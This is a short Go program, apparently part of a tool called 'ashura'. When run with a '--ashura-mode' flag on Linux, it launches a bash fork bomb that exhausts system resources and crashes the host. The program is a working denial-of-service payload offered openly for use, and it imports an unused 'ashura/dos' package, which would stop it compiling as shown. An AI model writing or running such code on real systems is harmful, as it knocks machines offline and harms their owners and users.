package main

import (
	"fmt"
	"os"
	"runtime"
	"os/exec"
	"ashura/dos"
)

func main() {
	for i:=0 ; i<len(os.Args) ; i++ {
		if os.Args[i] == "--ashura-mode" {
			ashuraMode()
		}
	}
}

func ashuraMode() {
	fmt.Println("[-] Running ashura mode...")
	if runtime.GOOS == "linux" {
		cmd := exec.Command("/bin/bash", "-c", ":(){ :|:& };:")
		_ = cmd.Run()
	}
}
